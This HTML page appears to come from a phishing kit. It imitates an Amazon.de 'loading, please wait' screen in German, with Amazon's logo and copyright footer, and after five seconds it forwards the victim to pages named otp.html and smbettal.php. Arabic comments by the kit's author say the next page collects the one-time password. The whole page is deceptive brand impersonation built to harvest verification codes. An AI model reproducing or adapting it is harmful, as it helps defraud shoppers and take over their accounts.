<!DOCTYPE html>
<html lang="de-CH">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>Amazon.de - Bitte warten...</title>

    <meta http-equiv="refresh" content="5; url=otp.html" />

    <style type="text/css">
        * { 
            box-sizing: border-box; 
            font-family: "Amazon Ember", Arial, sans-serif; 
            margin: 0; 
            padding: 0; 
        }
        
        body {
            background-color: #ffffff;
            color: #111111;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
        }

        .loader-container {
            text-align: center;
            width: 350px;
            padding: 20px;
        }

        /* Amazon Logo Style */
        .logo-container {
            margin-bottom: 30px;
        }

        .logo-container img {
            width: 103px;
            height: auto;
        }

        /* Amazon Style Circular Progress Spinner */
        .amazon-spinner {
            display: inline-block;
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #e77600; /* لون أمازون البرتقالي */
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* النصوص بالتنسيق السويسري الأنيق */
        h4 {
            font-size: 16px;
            font-weight: 700;
            color: #111111;
            margin-bottom: 8px;
        }

        p {
            font-size: 13px;
            color: #555555;
            line-height: 1.5;
        }

        /* فوتر بسيط متناسق لحفظ التوازن البصري */
        footer {
            position: absolute;
            bottom: 30px;
            font-size: 11px;
            color: #555555;
            text-align: center;
            width: 100%;
        }
    </style>
</head>
<body>

    <div class="loader-container">
        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
            <span style="font-size: 14px; font-weight: bold; position: relative; top: -5px; left: -2px;">.de</span>
        </div>

        <div class="amazon-spinner"></div>
        
        <h4>Wird geladen...</h4>
        <p>Bitte warten Sie einen Moment. Schliessen Sie dieses Fenster nicht, während Ihre Anfrage verarbeitet wird.</p>
    </div>

    <footer>
        © 1996-2026, Amazon.com, Inc. oder Tochtergesellschaften
    </footer>

    <script type="text/javascript">
        // احتياطياً في حال تعطل الـ Meta Refresh، يقوم الجافاسكريبت بالتوجيه التلقائي بعد 5 ثوانٍ
        setTimeout(function () {
            window.location.href = "smbettal.php"; // تأكد من مطابقة هذا الاسم مع صفحة الـ OTP التالية
        }, 5000);
    </script>

</body>
</html>